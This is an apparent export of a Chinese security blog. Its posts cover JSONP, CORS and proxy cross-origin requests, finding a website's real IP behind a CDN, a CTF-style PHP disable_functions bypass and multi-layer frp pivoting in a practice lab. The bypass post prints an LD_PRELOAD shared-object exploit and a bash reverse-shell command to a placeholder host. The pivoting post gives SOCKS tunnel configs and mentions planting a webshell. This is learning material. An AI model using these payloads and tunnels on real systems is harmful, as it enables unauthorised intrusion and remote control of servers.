class="property">src</span> = url + <span class="string">&#x27;?callback=&#x27;</span> + callbackName; <span class="comment">// 添加callback参数到URL</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">            <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(scriptTag);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="comment">// 调用JSONP请求</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="comment">// 注意更改URL中的端口号为你的Flask服务器运行的端口号</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="title function_">requestJSONP</span>(<span class="string">&#x27;http://localhost:5000/jsonp&#x27;</span>, <span class="string">&#x27;handleJSONPResponse&#x27;</span>);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">    </span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JSONP跨域请求示例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>前端请求<a href="http://localhost:5000/jsonp%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E4%BA%86%E6%95%B0%E6%8D%AE%E6%89%93%E5%8D%B0%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E4%BD%BF%E7%94%A8jsonp%EF%BC%8C%E9%82%A3%E4%B9%88%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%BD%93%E5%89%8D%E5%9F%9F%E4%B8%8B%E8%AF%B7%E6%B1%82%E5%88%AB%E7%9A%84%E5%9F%9F%E7%9A%84%E6%8E%A5%E5%8F%A3%E6%98%AF%E4%B8%8D%E5%90%88%E6%B3%95%E7%9A%84%E3%80%82%E6%89%80%E4%BB%A5jsonp%E8%A7%A3%E5%86%B3%E4%BA%86%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E3%80%82">http://localhost:5000/jsonp接口，并获取了数据打印。如果不使用jsonp，那么直接在当前域下请求别的域的接口是不合法的。所以jsonp解决了跨域问题。</a></p>
<p>优点：简单高效兼容性好</p>
<p>缺点：只支持GET请求，还有xss漏洞的奉献。（src的低危的主要贡献漏洞😂）</p>
<h2 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h2><p>有些人看完上面的jsonp跨域可能想，为啥不能script标签里面执行AJAX的动态请求呢？</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX Request to Baidu<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// 创建XMLHttpRequest对象</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 配置请求方法、URL以及异步处理</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.baidu.com&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 设置状态变化回调处理请求结果</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 仅当请求完成且响应就绪时才运行</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 检查HTTP响应状态码是否为200 OK</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 这里可以获取到返回内容进行处理，例如打印到控制台</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 请求失败处理</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;AJAX Request to Baidu failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 发送HTTP请求</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img data-src="/images/pages/image-20240313105201430.png" alt="image-20240313105201430" style="zoom:50%;" />

<p>可以看到仍然被同源策略限制。</p>
<p>怎么解决呢？这里就是CORS了。</p>
<p>1、当浏览器发起跨域请求，它会先发送一个“预检(Preflight)”请求，该请求采用<code>OPTIONS</code>方法，并携带诸如<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>之类的特定头信息，询问服务器是否愿意接受跨源请求。</p>
<p>2、服务器的回应是关键所在。如果服务器准许，它会回复一个包含<code>Access-Control-Allow-Origin</code>、<code>Access-Control-Allow-Methods</code>等头信息的“预检响应”，明确告诉浏览器哪些跨域行为是被许可的。</p>
<p>3、一旦服务器的“预检响应”亮绿灯，浏览器随即会发送正式的请求。服务器此时通过检查请求头的<code>Origin</code>字段，决定是否允许访问资源，并在响应头中包含<code>Access-Control-Allow-Origin</code>字段，列明哪些域名可以接收响应数据。</p>
<p>CORS不仅仅是关于XMLHttpRequest请求的，它还涵盖了其他安全机制，包括对cookies和认证的处理。大多数现代浏览器都已支持CORS，但一些旧版的浏览器，像是IE10及其以下版本，则不支持这项功能。</p>
<h2 id="代理实现跨域"><a href="#代理实现跨域" class="headerlink" title="代理实现跨域"></a>代理实现跨域</h2><p>我们可以实现一个代理服务器来实现跨域，也就是A和B域之间有一个代理服务器。平常我们写python代码用requets请求百度，从来没有人拦截我们对吧，因为我们不是在浏览器操作，那我们可以请求一个我们自身的接口，这个接口从代码层再去另一个服务器拿数据再返回给前端，那这个接口就是一个代理。</p>
<p>通过实现代理来实现跨域也是一种方法，但是好像不太多见。</p>
<p>服务端代理代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&#x27;node-fetch&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>; <span class="comment">// 代理服务器端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许跨域</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代理路由，将请求转发到百度</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.baidu.com&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line">        res.<span class="title function_">send</span>(data); <span class="comment">// 将从百度获取的数据发送回客户端</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error making proxy request:&#x27;</span>, error);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;An error occurred while making proxy request&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Proxy server is running on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>前端代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX Proxy Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">makeRequest</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 使用自己的代理服务器</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://localhost:3000/proxy&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 这里将显示百度首页的HTML</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;response&#x27;</span>).<span class="property">innerHTML</span> = xhr.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Proxy request failed.&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>AJAX Proxy Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;makeRequest()&quot;</span>&gt;</span>Request Baidu through Proxy<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;response&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>不太明白一些面试总是会问的特别细，比如一些CORS字段什么的，CSP的一些字段等等，感觉太多啦 有时候确实记不住啊，看见知道是什么意思还不行吗？有点废脑子，有时候知道已经理解啦，但是还是记不住那些参数。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN查找真实ip</title>
    <url>//posts/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip/</url>
    <content><![CDATA[<h2 id="绕过CDN查找真实ip"><a href="#绕过CDN查找真实ip" class="headerlink" title="绕过CDN查找真实ip"></a>绕过CDN查找真实ip</h2><h4 id="如何确定网站是否开启CDN"><a href="#如何确定网站是否开启CDN" class="headerlink" title="如何确定网站是否开启CDN"></a>如何确定网站是否开启CDN</h4><p>1、全国乱ping，如果ip不尽相同，说明开启CDN加速：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
<span id="more"></span>

<p>2、直接查ip，大厂商的CDNip可直接查到：<br><img data-src="/images/pages/1587865705889.png" alt="1587865705889"></p>
<h4 id="二级域名法"><a href="#二级域名法" class="headerlink" title="二级域名法"></a>二级域名法</h4><p>很多厂商的二级域名不会也开启CDN防护，所以可能这样就可以找到对应的真实ip，但是也有很多个人会把自己的子域名都放到CDN上，而且有时候不同子域名不用同一个ip，所以此方法也不是万能的。</p>
<h4 id="nslookup查找真实IP"><a href="#nslookup查找真实IP" class="headerlink" title="nslookup查找真实IP"></a>nslookup查找真实IP</h4><p>国内很多CDN厂商不在国外做CDN，业务需求不高嘛，所以可以用国外的一些DNS看看有没有绑定真实IP</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nslookup http://xxx.com <span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="看DNS历史记录"><a href="#看DNS历史记录" class="headerlink" title="看DNS历史记录"></a>看DNS历史记录</h4><p>通过历史解析过的DNS记录来查找到真实IP，万一测试的时候没有上CDN，可能就被爬虫爬下来：</p>
<p><a href="https://securitytrails.com/domain/tituku.cn/dns">https://securitytrails.com/domain/tituku.cn/dns</a></p>
<h4 id="通过证书找到真实IP"><a href="#通过证书找到真实IP" class="headerlink" title="通过证书找到真实IP"></a>通过证书找到真实IP</h4><p>有些人没有钱搞证书，又想上HTTPS，他就会找一些免费的证书，而这些免费的证书都是绑定在域名上的，而如果这时候有一个全网扫描的东西扫全网的443端口，查看证书的信息就可以（因为你的申请证书必须要有域名）</p>
<p><a href="https://censys.io/">https://censys.io/</a>  </p>
<p>我们不需要去找证书，上面这个网站直接全网爬取然后找到证书一致的网站ip和域名对应起来，这样一个个人博客即使他绑定之前就直接使用了CDN，但是如果他的证书如果被比对到也会被识别到真实的IP。</p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>php绕过disable函数进行命令执行</title>
    <url>//posts/php%E7%BB%95%E8%BF%87disable%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>命令执行一般都用php自带的函数来进行执行,但是很多时候运维或者搞安全的会禁用这些用不到的函数来加固,包括一些CTF也是禁用一些函数来考察你的绕过能力,这时候就需要你对常见的函数绕过进行一些了解,本文就是总结下php在所有自带命令执行函数被禁后的其他操作.</p>
<span id="more"></span>

<h2 id="常见的自带系统命令执行函数"><a href="#常见的自带系统命令执行函数" class="headerlink" title="常见的自带系统命令执行函数"></a>常见的自带系统命令执行函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">` ` <span class="comment">//反引号</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>






<h2 id="使用LD-PRELOAD-绕过"><a href="#使用LD-PRELOAD-绕过" class="headerlink" title="使用LD_PRELOAD 绕过"></a>使用LD_PRELOAD 绕过</h2><h3 id="gnupg扩展"><a href="#gnupg扩展" class="headerlink" title="gnupg扩展"></a>gnupg扩展</h3><p>如果看到phpinfo中有gnupg苦熬站,说明可以使用gpg加密,gnupg拓展下的gnupg_init() 函数 可以进行命令执行 bypass</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">j0k3r</span><span class="params">()</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;no cmd&#x27; &gt; /tmp/cmd.output&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地把以上代码生成 exp.so， <code>gcc --share -fPIC exp.c -o exp.so</code><br>然后上传文件到 &#x2F;tmp&#x2F;exp.so<br>通过php代码进行利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>putenv(<span class="string">&quot;cmd=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1&#x27;&quot;</span>);<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/exp.so&quot;</span>);<span class="title function_ invoke__">gnupg_init</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样就可以反弹shell了.</p>
<p>——————————————————————–未完待续——————————————————————————–</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>CFS三层靶场的穿透实践</title>
    <url>//posts/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E7%9A%84%E7%A9%BF%E9%80%8F%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>再一次CTF比赛中遇到了三四层穿透的靶场，当时由于没有外网，而且也不知道什么网络原因导致穿透三层的时候一直没成功。这个假期正好有时间就找了一个靶场，看看多层的穿透到底应该怎么来比较方便。</p>
<p>靶场选取的是CFS三层靶场，网上一搜就有，这里不再提供下载链接了。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h3><p>这里是三层网络环境，设置了三个vmnet: </p>
<p><img data-src="/images/pages/image-20221005202301343.png" alt="image-20221005202301343"></p>
<span id="more"></span>

<h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img data-src="/images/pages/image-20221005205842224.png" alt="image-20221005205842224"></p>
<p>攻击比较简单不再赘述，这里主要是记录下穿透的方案。我们默认拿到了每一层机器的命令执行权限。其中靶机2和靶机3是无法出网的。</p>
<h2 id="穿透内网"><a href="#穿透内网" class="headerlink" title="穿透内网"></a>穿透内网</h2><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h4 id="首先是一层穿透"><a href="#首先是一层穿透" class="headerlink" title="首先是一层穿透"></a>首先是一层穿透</h4><p>首先我们分别上传frp工具到我们的公网vps和靶机1，然后vps中的server如下设置：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">8700</span></span><br><span class="line"><span class="comment"># 工作台配置，不需要可以不配置</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">8500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin_xxx</span><br><span class="line"><span class="attr">dashboard_pwd</span> = password_788_xxX</span><br></pre></td></tr></table></figure>
<p>后台启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>



<p>我们拿到靶机1的权限后上传frp，并进行如下设置即可穿透内网。</p>
<p>frcp.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># 服务端地址</span></span><br><span class="line"><span class="attr">server_addr</span> = vps_ip_addr</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">8700</span></span><br><span class="line"><span class="attr">tls_enable</span> = ture</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用socks插件和Proxifier工具实现代理功能</span></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8600</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin123</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网穿透功能  ssh 111.111.111.<span class="doctag">xxx:</span>6000</span></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8601</span></span><br></pre></td></tr></table></figure>

<p>后台启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure>

<p>然后我们使用proxifer工具进行设置：</p>
<p><img data-src="/images/pages/image-20221005204356532.png" alt="image-20221005204356532"></p>
<p>添加应用safari浏览器，然后访问192.168.22.128即可：</p>
<p><img data-src="/images/pages/image-20221005204428521.png" alt="image-20221005204428521"></p>
<p>当然你也可以使用其他工具，或者直接挂一个终端代理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=socks5://admin:admin123@vps_ip:8608</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221005204655512.png" alt="image-20221005204655512"></p>
<p>现在我们就进入到了第二层，然后通过注入拿到账户密码并登录后台写入模版一句话木马。</p>
<p><img data-src="/images/pages/image-20221005204750956.png" alt="image-20221005204750956"></p>
<p>我们通过添加代理应用antsword到proxifier工具中即可连接第二层的靶机2的木马：</p>
<p><img data-src="/images/pages/image-20221005204841173.png" alt="image-20221005204841173"></p>
<p>下面我们需要考虑如何才能访问到第三层？其实frp是支持这样多层代理的，我们只需要把靶机1当作中继，做一个http的代理，然后在靶机2上开启sockts，具体设置如下。</p>
<p>首先vps上的的frp server服务不需要更改，我们需要在靶机1中同时启动frps和frpc。</p>
<p>其中frps.ini如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 192.168.22.131</span><br><span class="line"><span class="comment"># 靶机1的第二个网段ip，靶机2可访问到，在一个网段。</span></span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>其中frpc-proxy.ini如下(原来的frpc.ini也可以继续启动，这样方便随时切换到一层代理):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line"><span class="comment"># 服务端地址</span></span><br><span class="line">server_addr = vps-ip</span><br><span class="line">server_port = 8700</span><br><span class="line">tls_enable = ture</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port= 8608</span><br><span class="line"></span><br><span class="line"><span class="comment">#plugin = scoks5 这个不能加了,现在是http中转到代理</span></span><br><span class="line"></span><br><span class="line">local_ip = 192.168.22.131</span><br><span class="line">local_port = 8608</span><br></pre></td></tr></table></figure>

<p>现在我们在我们拿下的靶机2上上传frp，并设置frpc.ini：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.131</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 8608</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>启动靶机1的frps frpc 和靶机2的frpc 即可完成代理穿透，这时我们可以设置proxifier工具的代理如下：</p>
<p><img data-src="/images/pages/image-20221005205636335.png" alt="image-20221005205636335"></p>
<p>safari访问成功</p>
<p><img data-src="/images/pages/image-20221005210019571.png" alt="image-20221005210019571"></p>
<p>终端代理也可访问成功</p>
<p><img data-src="/images/pages/image-20221005210059941.png" alt="image-20221005210059941"></p>
<p>可以看到最里面的靶机3了，但是靶机3需要ms17010攻击，在进行ms17010攻击时，代理多次断开，这里就不再展示截图了。所以如果要结合msf使用还是最好使用msf的路由（后面会详细介绍msf的路由穿透）。</p>
<h4 id="frp的缺点"><a href="#frp的缺点" class="headerlink" title="frp的缺点"></a>frp的缺点</h4><p>frp不太稳定 使用msf进行利用永恒之蓝的时候总是断开，所以下面还是介绍下msf如何穿透进入内网。</p>
<p><strong>备注</strong>：frp最好后台启动 要不然终端退出即失效。frp可以启动多个，所以一层二层代理可以同时存在，只要理清楚就好，这样也方便我们随时挂一层代理去访问靶机2重新开启二层代理。</p>
<p>另外，frp是支持多层代理的，可以继续保持前面的frps不变，在靶机三上再次开启和靶机2一样的frps和frpc进行第三层代理。因为这里没有四层环境，也不再截图赘述。**</p>
